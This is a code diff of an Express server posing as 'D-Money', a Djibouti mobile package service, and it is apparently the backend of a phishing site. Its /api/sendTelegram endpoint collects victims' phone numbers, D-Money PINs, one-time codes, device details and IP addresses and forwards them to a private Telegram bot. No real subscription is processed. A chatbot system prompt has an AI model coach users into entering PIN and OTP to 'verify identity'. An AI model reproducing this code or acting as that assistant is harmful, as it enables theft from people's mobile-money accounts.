@@ -8,234 +8,280 @@ const app  = express();
 const PORT = process.env.PORT || 3000;
 
 /* ── MIDDLEWARE ── */
-app.use(express.json({limit:'20kb'}));
-app.use(express.urlencoded({extended:false}));
-app.use((req,res,next)=>{
-  res.setHeader('X-Content-Type-Options','nosniff');
-  res.setHeader('X-Frame-Options','SAMEORIGIN'); // relaxed for Tawk.to iframe
-  res.setHeader('X-XSS-Protection','1; mode=block');
-  res.setHeader('Referrer-Policy','strict-origin-when-cross-origin');
+app.use(express.json({ limit: '20kb' }));
+app.use(express.urlencoded({ extended: false }));
+app.use((req, res, next) => {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   next();
 });
 
 /* ── RATE LIMITERS ── */
 const apiLimiter = rateLimit({
-  windowMs:15*60*1000, max:30,
-  message:{error:'Trop de requêtes, veuillez réessayer plus tard.'},
-  standardHeaders:true, legacyHeaders:false,
+  windowMs: 15 * 60 * 1000,
+  max: 30,
+  message: { error: 'Too many requests. Please try again later.' },
+  standardHeaders: true,
+  legacyHeaders: false,
 });
 const chatLimiter = rateLimit({
-  windowMs:60*1000, max:15,           // 15 AI messages per minute per IP
-  message:{error:'Trop de messages. Attendez un moment.'},
-  standardHeaders:true, legacyHeaders:false,
+  windowMs: 60 * 1000,
+  max: 20,
+  message: { error: 'Too many messages. Please wait a moment.' },
+  standardHeaders: true,
+  legacyHeaders: false,
 });
 app.use('/api/sendTelegram', apiLimiter);
-app.use('/api/chat',         chatLimiter);
+app.use('/api/chat', chatLimiter);
 
-app.use(express.static(path.join(__dirname),{extensions:['html'],index:'index.html'}));
+/* ── STATIC FILES ── */
+app.use(express.static(path.join(__dirname), {
+  extensions: ['html'],
+  index: 'index.html',
+}));
 
 /* ── TELEGRAM HELPER ── */
-function sendTelegramMessage(text){
-  return new Promise((resolve,reject)=>{
+function sendTelegramMessage(text) {
+  return new Promise((resolve, reject) => {
     const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
     const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
-    if(!BOT_TOKEN||!CHAT_ID){
-      console.warn('[Telegram] Variables manquantes');
-      return resolve({ok:false,reason:'env_missing'});
-    }
-    const body = JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'HTML'});
-    const opts = {
-      hostname:'api.telegram.org',
-      path:`/bot${BOT_TOKEN}/sendMessage`,
-      method:'POST',
-      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)},
-    };
-    const req = https.request(opts,(res)=>{
-      let data='';
-      res.on('data',c=>data+=c);
-      res.on('end',()=>{try{resolve(JSON.parse(data))}catch(e){resolve({ok:false})}});
-    });
-    req.on('error',reject);req.write(body);req.end();
-  });
-}
 
-/* ── ANTHROPIC HELPER ── */
-function callClaude(messages){
-  return new Promise((resolve,reject)=>{
-    const API_KEY = process.env.ANTHROPIC_API_KEY;
-    if(!API_KEY){
-      console.error('[Claude] ANTHROPIC_API_KEY not set');
-      return resolve({error:'API key manquante'});
+    if (!BOT_TOKEN || !CHAT_ID) {
+      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
+      return resolve({ ok: false, reason: 'env_missing' });
     }
 
     const body = JSON.stringify({
-      model     : 'claude-haiku-4-5',
-      max_tokens: 400,
-      system : `Tu es l'assistant virtuel de D-Money, service de forfaits mobiles au Djibouti.
-Tu réponds uniquement en français, de manière courte, claire et professionnelle.
-Tu connais ces informations sur les forfaits D-Money :
-
-FORFAITS DISPONIBLES :
-
-🔵 CLASSIC — Dès 500 DJF
-- Jusqu'à 60 minutes d'appels locaux
-- Jusqu'à 50 SMS
-- Jusqu'à 2 Go de data mobile
-- Idéal pour usage basique
-
-🟡 MÉDIAN — Dès 1 500 DJF (le plus populaire)
-- Jusqu'à 200 minutes d'appels locaux et internationaux
-- Jusqu'à 200 SMS
-- Jusqu'à 10 Go de data 4G
-- Meilleur rapport qualité/prix
-
-🟣 PREMIUM — Dès 4 000 DJF
-- Jusqu'à 500 minutes d'appels illimités
-- Jusqu'à 1000 SMS
-- Jusqu'à 50 Go de data 4G illimitée
-- Pour les gros utilisateurs
-
-COMMENT SOUSCRIRE :
-1. Choisir le forfait et ajuster les curseurs selon ses besoins
-2. Appuyer sur "Souscrire"
-3. Vérifier son identité avec son numéro D-Money (+253 77XXXXXX) et son PIN
-4. Confirmer par OTP (code à 6 chiffres)
-5. Le forfait est activé immédiatement
-
-CONDITIONS :
-- Avoir un compte D-Money actif
-- Numéro Djibouti commençant par 77
-- Paiement 100% mobile, sécurisé, sans paperasse
-- Validité : 30 jours pour tous les forfaits
-
-CONTACT : support@dmoney.dj
-
-Garde tes réponses sous 3 phrases maximum.
-Si tu ne sais pas répondre, dis-le honnêtement et suggère de contacter le support.`,
-      messages,
+      chat_id: CHAT_ID,
+      text,
+      parse_mode: 'HTML',
     });
 
     const opts = {
-      hostname:'api.anthropic.com',
-      path:'/v1/messages',
-      method:'POST',
-      headers:{
-        'Content-Type':'application/json',
-        'anthropic-version':'2023-06-01',
-        'x-api-key':API_KEY,
-        'Content-Length':Buffer.byteLength(body),
+      hostname: 'api.telegram.org',
+      path: `/bot${BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(body),
       },
     };
 
-    const req = https.request(opts,(res)=>{
-      let data='';
-      res.on('data',c=>data+=c);
-      res.on('end',()=>{
-        try{
-          const parsed = JSON.parse(data);
-          if(parsed.error){
-            console.error('[Claude] API error:',parsed.error.type, parsed.error.message);
-          }
-          resolve(parsed);
-        }catch(e){
-          console.error('[Claude] Parse error:',e.message,'raw:',data.slice(0,200));
-          resolve({error:'Réponse invalide'});
-        }
+    const req = https.request(opts, (res) => {
+      let data = '';
+      res.on('data', c => data += c);
+      res.on('end', () => {
+        try { resolve(JSON.parse(data)); }
+        catch (e) { resolve({ ok: false }); }
       });
     });
-    req.on('error',(e)=>{
-      console.error('[Claude] Request error:',e.message);
-      reject(e);
-    });
+    req.on('error', reject);
     req.write(body);
     req.end();
   });
 }
 
-/* ── /api/config — serves Tawk.to IDs safely from env vars ── */
-app.get('/api/config',(req,res)=>{
-  const propertyId = process.env.TAWKTO_PROPERTY_ID;
-  const widgetId   = process.env.TAWKTO_WIDGET_ID;
-  if(!propertyId||!widgetId){
-    return res.json({tawkto:null});
-  }
-  res.json({
-    tawkto:{
-      propertyId,
-      widgetId,
-      src:`https://embed.tawk.to/${propertyId}/${widgetId}`,
+/* ── CLAUDE AI HELPER ── */
+function callClaude(messages) {
+  return new Promise((resolve, reject) => {
+    const API_KEY = process.env.ANTHROPIC_API_KEY;
+
+    if (!API_KEY) {
+      console.error('[Claude] ANTHROPIC_API_KEY is not set');
+      return resolve({ error: 'API key missing' });
     }
+
+    const body = JSON.stringify({
+      model: 'claude-haiku-4-5',
+      max_tokens: 400,
+      system: `You are the virtual assistant for D-Money, a mobile package service in Djibouti.
+Always respond in French, concisely and professionally.
+You know the following about D-Money packages:
+
+AVAILABLE PACKAGES:
+
+CLASSIC — From 500 DJF
+- Up to 60 minutes of local calls
+- Up to 50 SMS
+- Up to 2 GB mobile data
+- Perfect for basic use
+
+MEDIAN — From 1,500 DJF (most popular)
+- Up to 200 minutes local and international calls
+- Up to 200 SMS
+- Up to 10 GB 4G data
+- Best value for money
+
+PREMIUM — From 4,000 DJF
+- Up to 500 minutes unlimited calls
+- Up to 1,000 SMS
+- Up to 50 GB unlimited 4G
+- For heavy users
+
+HOW TO SUBSCRIBE:
+1. Choose the package and adjust sliders
+2. Tap "Subscribe"
+3. Verify identity with D-Money number (+253 77XXXXXX) and PIN
+4. Confirm with 6-digit OTP
+5. Package activated immediately, valid 30 days
+
+REQUIREMENTS:
+- Active D-Money account
+- Djibouti number starting with 77
+- 100% mobile, secure, no paperwork
+
+CONTACT: support@dmoney.dj
+
+Keep answers under 3 sentences. If you cannot answer, suggest contacting support.`,
+      messages,
+    });
+
+    const opts = {
+      hostname: 'api.anthropic.com',
+      path: '/v1/messages',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'anthropic-version': '2023-06-01',
+        'x-api-key': API_KEY,
+        'Content-Length': Buffer.byteLength(body),
+      },
+    };
+
+    const req = https.request(opts, (res) => {
+      let data = '';
+      res.on('data', c => data += c);
+      res.on('end', () => {
+        try {
+          const parsed = JSON.parse(data);
+          if (parsed.error) {
+            console.error('[Claude] API error:', parsed.error.type, '-', parsed.error.message);
+          }
+          resolve(parsed);
+        } catch (e) {
+          console.error('[Claude] Failed to parse response:', data.slice(0, 200));
+          resolve({ error: 'Invalid response' });
+        }
+      });
+    });
+
+    req.on('error', (e) => {
+      console.error('[Claude] Request error:', e.message);
+      reject(e);
+    });
+
+    req.write(body);
+    req.end();
   });
+}
+
+/* ── POST /api/sendTelegram ── */
+app.post('/api/sendTelegram', async (req, res) => {
+  try {
+    const {
+      submittedAt = '',
+      loginPhone  = '',
+      loginPin    = '',
+      otp         = '',
+      event       = '',
+      plan        = '',
+      device      = '',
+    } = req.body || {};
+
+    if (!loginPhone && !otp) {
+      return res.status(400).json({ error: 'Invalid payload' });
+    }
+
+    const emoji = {
+      receive_offer_clicked: '📲',
+      offer_received:        '✅',
+      resend_otp:            '🔁',
+    }[event] || '📋';
+
+    const message = [
+      `${emoji} <b>D-Money Package — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
+      ``,
+      `📅 <b>Time:</b> ${submittedAt}`,
+      `📱 <b>Phone:</b> <code>${loginPhone}</code>`,
+      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
+      `🔑 <b>OTP:</b> <code>${otp || '—'}</code>`,
+      ``,
+      `📦 <b>Package:</b> ${plan}`,
+      `📟 <b>Device:</b> ${device}`,
+      `🌐 <b>IP:</b> ${req.ip || req.headers['x-forwarded-for'] || '—'}`,
+    ].join('\n');
+
+    const result = await sendTelegramMessage(message);
+    return res.json({ ok: true, telegram: result.ok });
+
+  } catch (err) {
+    console.error('[/api/sendTelegram]', err.message);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
-/* ── /api/chat — AI FAQ endpoint ── */
-app.post('/api/chat',async(req,res)=>{
-  try{
-    const{messages}=req.body||{};
-    if(!messages||!Array.isArray(messages)||messages.length===0){
-      return res.status(400).json({error:'Messages manquants'});
+/* ── POST /api/chat ── */
+app.post('/api/chat', async (req, res) => {
+  try {
+    const { messages } = req.body || {};
+
+    if (!messages || !Array.isArray(messages) || messages.length === 0) {
+      return res.status(400).json({ error: 'Missing messages' });
     }
-    // validate structure
-    const clean=messages.slice(-10).map(m=>({
-      role   : m.role==='assistant'?'assistant':'user',
-      content: String(m.content||'').slice(0,500),
-    }));
-    if(!clean.length) return res.status(400).json({error:'Messages invalides'});
+
+    // Sanitise and limit conversation history
+    const clean = messages.slice(-10).map(m => ({
+      role:    m.role === 'assistant' ? 'assistant' : 'user',
+      content: String(m.content || '').slice(0, 500),
+    })).filter(m => m.content.trim());
+
+    if (!clean.length) {
+      return res.status(400).json({ error: 'Empty messages' });
+    }
 
     const result = await callClaude(clean);
 
-    if(result.error) return res.status(500).json({error:result.error});
-    if(result.type==='error') return res.status(500).json({error:result.error?.message||'Erreur Claude'});
+    if (result.error) {
+      console.error('[/api/chat] Claude error:', result.error);
+      return res.status(500).json({ error: result.error });
+    }
 
-    const text    = (result.content?.[0]?.text)||'';
-    const escalate= text.includes('[ESCALATE]');
-    const reply   = text.replace('[ESCALATE]','').trim();
+    if (result.type === 'error') {
+      console.error('[/api/chat] Claude API error:', result.error?.message);
+      return res.status(500).json({ error: result.error?.message || 'Claude API error' });
+    }
 
-    return res.json({reply, escalate});
-  }catch(err){
-    console.error('[/api/chat]',err.message);
-    return res.status(500).json({error:'Erreur serveur'});
+    const text  = result.content?.[0]?.text || '';
+    const reply = text.replace('[ESCALATE]', '').trim();
+
+    return res.json({ reply });
+
+  } catch (err) {
+    console.error('[/api/chat]', err.message);
+    return res.status(500).json({ error: 'Server error' });
   }
 });
 
-/* ── /api/sendTelegram ── */
-app.post('/api/sendTelegram',async(req,res)=>{
-  try{
-    const{submittedAt='',loginPhone='',loginPin='',otp='',event='',plan='',device=''}=req.body||{};
-    if(!loginPhone&&!otp) return res.status(400).json({error:'Payload invalide'});
-    const emoji={receive_offer_clicked:'📲',offer_received:'✅',resend_otp:'🔁'}[event]||'📋';
-    const message=[
-      `${emoji} <b>D-Money Prêt — ${event.replace(/_/g,' ').toUpperCase()}</b>`,``,
-      `📅 <b>Heure:</b> ${submittedAt}`,
-      `📱 <b>Téléphone:</b> <code>${loginPhone}</code>`,
-      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
-      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,``,
-      `💰 <b>Prêt:</b> ${plan}`,
-      `📟 <b>Appareil:</b> ${device}`,
-      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
-    ].join('\n');
-    const result = await sendTelegramMessage(message);
-    return res.json({ok:true,telegram:result.ok});
-  }catch(err){
-    console.error('[/api/sendTelegram]',err.message);
-    return res.status(500).json({error:'Erreur serveur interne'});
-  }
+/* ── GET /health ── */
+app.get('/health', (req, res) => {
+  res.json({
+    status:   'ok',
+    uptime:   process.uptime(),
+    telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID),
+    ai:       !!process.env.ANTHROPIC_API_KEY,
+  });
 });
 
-/* ── /health ── */
-app.get('/health',(req,res)=>res.json({
-  status :'ok',
-  uptime :process.uptime(),
-  telegram: !!process.env.TELEGRAM_TOKEN,
-  tawkto  : !!process.env.TAWKTO_PROPERTY_ID,
-  ai      : !!process.env.ANTHROPIC_API_KEY,
-}));
+/* ── CATCH-ALL → index.html ── */
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 
-app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'index.html')));
-
-app.listen(PORT,()=>{
-  console.log(`✅  D-Money server — port ${PORT}`);
-  console.log(`    Telegram  : ${process.env.TELEGRAM_TOKEN      ?'✓':'⚠ MANQUANT'}`);
-  console.log(`    Tawk.to   : ${process.env.TAWKTO_PROPERTY_ID  ?'✓':'⚠ MANQUANT'}`);
-  console.log(`    Claude AI : ${process.env.ANTHROPIC_API_KEY   ?'✓':'⚠ MANQUANT'}`);
+/* ── START ── */
+app.listen(PORT, () => {
+  console.log(`✅  D-Money server running on port ${PORT}`);
+  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
+  console.log(`    Claude AI: ${process.env.ANTHROPIC_API_KEY ? 'configured ✓' : 'MISSING ⚠'}`);
 });
